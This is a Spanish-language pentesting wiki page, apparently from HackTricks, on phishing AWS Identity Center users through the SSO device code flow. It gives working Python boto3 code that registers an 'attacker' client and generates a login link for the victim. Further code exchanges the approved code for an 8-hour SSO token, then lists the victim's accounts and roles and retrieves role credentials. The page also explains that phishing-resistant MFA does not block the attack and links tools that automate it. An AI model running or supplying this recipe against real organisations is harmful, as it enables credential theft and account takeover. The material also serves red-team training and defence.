# AWS - Identity Center & SSO Unauthenticated Enum

{{#include ../../../../banners/hacktricks-training.md}}

## AWS Device Code Phishing

Inicialmente propuesto en [**this blog post**](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/), es posible enviar un **link** a un usuario que use AWS SSO que, si el **usuario acepta**, el atacante podrá obtener un **token para suplantar al usuario** y acceder a todos los roles a los que el usuario puede acceder en el **Identity Center**.

Para llevar a cabo este ataque los requisitos son:

- La víctima necesita usar **Identity Center**
- El atacante debe conocer el **subdominio** usado por la víctima `<victimsub>.awsapps.com/start`

Con solo la información anterior, el **atacante podrá enviar un link al usuario** que, si es **aceptado**, otorgará al **atacante acceso a la cuenta de usuario de AWS**.

### Ataque

1. **Encontrar el subdominio**

El primer paso del atacante es averiguar el subdominio que la empresa víctima usa en su Identity Center. Esto se puede hacer mediante **OSINT** o **guessing + BF**, ya que la mayoría de las empresas usan su nombre o una variación del mismo aquí.

Con esta información, es posible obtener la región donde se configuró el Identity Center con:
```bash
curl https://victim.awsapps.com/start/ -s | grep -Eo '"region":"[a-z0-9\-]+"'
"region":"us-east-1
```
2. **Generar el enlace para la víctima & Enviarlo**

Ejecuta el siguiente código para generar un enlace de inicio de sesión de AWS SSO para que la víctima pueda autenticarse.\\
Para la demo, ejecuta este código en una consola de python y no la cierres, ya que más adelante necesitarás algunos objetos para obtener el token:
```python
import boto3

REGION = 'us-east-1' # CHANGE THIS
AWS_SSO_START_URL = 'https://victim.awsapps.com/start' # CHANGE THIS

sso_oidc = boto3.client('sso-oidc', region_name=REGION)
client = sso_oidc.register_client(
clientName = 'attacker',
clientType = 'public'
)

client_id = client.get('clientId')
client_secret = client.get('clientSecret')
authz = sso_oidc.start_device_authorization(
clientId=client_id,
clientSecret=client_secret,
startUrl=AWS_SSO_START_URL
)

url = authz.get('verificationUriComplete')
deviceCode = authz.get('deviceCode')
print("Give this URL to the victim: " + url)
```
¡Envía el enlace generado a la víctima usando tus increíbles habilidades de ingeniería social!

3. **Espera a que la víctima lo acepte**

Si la víctima **ya había iniciado sesión en AWS** solo necesitará aceptar conceder los permisos; si no lo estaba, tendrá que **iniciar sesión y luego aceptar conceder los permisos**.\
This is how the promp looks nowadays:

<figure><img src="../../../images/image (343).png" alt="" width="311"><figcaption></figcaption></figure>

4. **Obtener el token de acceso SSO**

Si la víctima aceptó el prompt, ejecuta este código para **generar un token SSO suplantando al usuario**:
```python
token_response = sso_oidc.create_token(
clientId=client_id,
clientSecret=client_secret,
grantType="urn:ietf:params:oauth:grant-type:device_code",
deviceCode=deviceCode
)
sso_token = token_response.get('accessToken')
```
El token de acceso SSO es **válido por 8h**.

5. **Suplantar al usuario**
```python
sso_client = boto3.client('sso', region_name=REGION)

# List accounts where the user has access
aws_accounts_response = sso_client.list_accounts(
accessToken=sso_token,
maxResults=100
)
aws_accounts_response.get('accountList', [])

# Get roles inside an account
roles_response = sso_client.list_account_roles(
accessToken=sso_token,
accountId=<account_id>
)
roles_response.get('roleList', [])

# Get credentials over a role

sts_creds = sso_client.get_role_credentials(
accessToken=sso_token,
roleName=<role_name>,
accountId=<account_id>
)
sts_creds.get('roleCredentials')
```
### Phishing del unphisable MFA

Es interesante saber que el ataque anterior **funciona incluso si se está usando un "unphisable MFA" (webAuth)**. Esto es porque el **workflow anterior nunca sale del dominio OAuth utilizado**. No como en otros phishing attacks donde el usuario necesita suplantar el dominio de login; en este caso el device code workflow se prepara de modo que un **code es conocido por un device** y el usuario puede login incluso desde otra máquina. Si se acepta el prompt, el device, únicamente por **conocer el code inicial**, va a poder **retrieve credentials** para el usuario.

For more info about this [**check this post**](https://mjg59.dreamwidth.org/62175.html).

### Herramientas automáticas

- [https://github.com/christophetd/aws-sso-device-code-authentication](https://github.com/christophetd/aws-sso-device-code-authentication)
- [https://github.com/sebastian-mora/awsssome_phish](https://github.com/sebastian-mora/awsssome_phish)

## Referencias

- [https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)
- [https://ruse.tech/blogs/aws-sso-phishing](https://ruse.tech/blogs/aws-sso-phishing)
- [https://mjg59.dreamwidth.org/62175.html](https://mjg59.dreamwidth.org/62175.html)
- [https://ramimac.me/aws-device-auth](https://ramimac.me/aws-device-auth)

{{#include ../../../../banners/hacktricks-training.md}}
